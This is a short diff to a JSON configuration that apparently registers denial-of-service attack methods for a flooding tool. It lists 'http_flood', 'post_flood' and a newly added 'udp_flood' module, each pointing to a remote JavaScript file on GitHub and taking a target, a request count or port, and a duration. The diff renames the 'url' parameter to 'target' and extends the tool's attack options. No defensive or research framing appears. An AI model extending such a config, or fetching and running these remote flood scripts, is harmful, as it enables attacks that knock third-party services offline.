@@ -2,7 +2,7 @@
     "http_flood": {
         "url": "https://raw.githubusercontent.com/cassbethany10-afk/test123/refs/heads/main/http_fload.js",
         "params": {
-            "url": {"required": true, "type": "string"},
+            "target": {"required": true, "type": "string"},
             "requests": {"required": true, "type": "number"},
             "duration": {"required": false, "type": "number", "default": 10}
         }
@@ -10,11 +10,18 @@
     "post_flood": {
         "url": "https://raw.githubusercontent.com/cassbethany10-afk/test123/refs/heads/main/post_flood.js",
         "params": {
-            "url": {"required": true, "type": "string"},
+            "target": {"required": true, "type": "string"},
             "requests": {"required": true, "type": "number"},
             "duration": {"required": false, "type": "number", "default": 10},
-            "data": {"required": false, "type": "string", "default": "test=123"},
-            "contentType": {"required": false, "type": "string", "default": "application/x-www-form-urlencoded"}
+            "data": {"required": false, "type": "string", "default": "test=123"}
+        }
+    },
+    "udp_flood": {
+        "url": "https://raw.githubusercontent.com/cassbethany10-afk/test123/refs/heads/main/udp_flood.js",
+        "params": {
+            "target": {"required": true, "type": "string"},
+            "port": {"required": true, "type": "number"},
+            "duration": {"required": false, "type": "number", "default": 10}
         }
     }
 }
